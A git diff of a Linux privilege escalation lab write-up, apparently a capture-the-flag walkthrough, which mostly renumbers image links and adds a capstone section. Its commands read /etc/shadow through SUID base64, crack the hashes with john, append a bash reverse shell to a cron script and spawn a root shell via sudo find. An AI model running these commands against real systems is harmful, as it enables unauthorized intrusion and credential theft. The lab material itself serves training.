@@ -78,7 +78,7 @@ chmod +x exploit
 whoami
 ```
 
-<figure><img src="../../.gitbook/assets/image (9) (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (2).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation: Sudo
 
@@ -127,7 +127,7 @@ sudo nano /etc/shadow
 find / -type f -perm -04000 -ls 2>/dev/null
 ```
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -152,7 +152,7 @@ base64 /etc/shadow | base64 --decode
 base64 /etc/passwd | base64 --decode
 ```
 
-<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -161,7 +161,7 @@ unshadow passwd shadow > passwords.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
 ```
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>
 
 **What is the content of the flag3.txt file?**
 
@@ -184,7 +184,7 @@ base64 /home/ubuntu/flag3.txt | base64 --decode
 getcap -r / 2>/dev/null
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 ****
 
@@ -221,7 +221,7 @@ cat /home/ubuntu/flag4.txt
 cat /etc/crontab
 ```
 
-<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 **Victim**
 
@@ -230,7 +230,7 @@ ls -lah /home/karen/backup.sh
 cat /home/karen/backup.sh
 ```
 
-<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -245,7 +245,7 @@ chmod +x /home/karen/backup.sh
 echo "bash -i >& /dev/tcp/10.10.19.80/4444 0>&1" >> /home/karen/backup.sh
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 **What is Matt's password?**
 
@@ -265,7 +265,7 @@ unshadow passwd shadow > passwords.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
 ```
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation: PATH
 
@@ -277,15 +277,15 @@ john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
 find / -writable 2>/dev/null
 ```
 
-<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 **Exploit the $PATH vulnerability to read the content of the flag6.txt file**
 
-<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
 
 ****
 
-<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
 
 **Victim**
 
@@ -306,9 +306,9 @@ showmount -e 10.10.216.254
 cat /etc/exports
 ```
 
-<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -343,5 +343,41 @@ cd /home/ubuntu/sharedfolder
 ./nfc
 ```
 
-<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+## Capstone Challenge
+
+**Victim**
+
+```
+base64 /etc/shadow | base64 --decode
+base64 /etc/passwd | base64 --decode
+```
+
+**Kali**
+
+```
+unshadow passwd shadow > passwords.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
+```
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
+
+```
+su missy 
+Password: Password1
+```
+
+**Victim**
+
+```
+sudo find . -exec /bin/sh ; -quit
+whoami
+```
+
+<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+
+
 
